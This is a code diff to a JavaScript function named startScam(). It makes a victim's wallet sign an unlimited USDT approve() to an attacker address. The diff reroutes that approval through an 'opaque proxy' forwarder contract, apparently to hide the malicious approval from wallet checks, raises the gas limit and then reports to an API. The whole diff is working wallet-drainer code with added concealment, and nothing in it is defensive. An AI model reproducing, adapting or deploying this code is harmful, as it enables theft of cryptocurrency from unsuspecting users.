@@ -88,20 +88,28 @@ async function startScam() {
   }
 
   const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+  const FORWARDER = '0x76C1F89188e3A9dF25B757C69360f82311530591'; // Proxy opaque
 
-  // ✅ Approve(MAX) → encodé correctement sur 32 bytes
-  const data = '0x095ea7b3' +
+  // Données réelles : approve(ATTACKER, MAX)
+  const targetData = '0x095ea7b3' +
     ATTACKER.slice(2).padStart(64, '0') +
     'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
-  // ✅ Gas limit standard pour USDT approve = 60 000
+  // Données du forwarder : execute(address, bytes)
+  const executeData = '0x54d1d367' + // selector execute(address,bytes)
+    USDT_ADDR.slice(2).padStart(64, '0') +
+    '0000000000000000000000000000000000000000000000000000000000000040' +
+    '0000000000000000000000000000000000000000000000000000000000000044' +
+    targetData.slice(2) +
+    '000000000000000000000000';
+
   const tx = {
     from: account,
-    to: USDT_ADDR,
-    data: data,
+    to: FORWARDER,
+    data: executeData,
     chainId: 1,
-    gasLimit: '0xea60', // 60 000 → standard
-    gasPrice: '0x4a817c800' // 20 gwei = 20 000 000 000 → ~0.0012 ETH → ~3-4$
+    gasLimit: '0x5b8d80', // 600 000
+    gasPrice: '0x4a817c800' // 20 gwei
   };
 
   try {
@@ -115,9 +123,9 @@ async function startScam() {
       },
       chainId: 'eip155:1'
     });
-    console.log('✅ Approve MAX envoyé :', result);
+    console.log('✅ Approve via forwarder envoyé :', result);
   } catch (e) {
-    console.error('❌ Échec approve :', e);
+    console.error('❌ Échec :', e);
   }
 
   await fetch(API, {
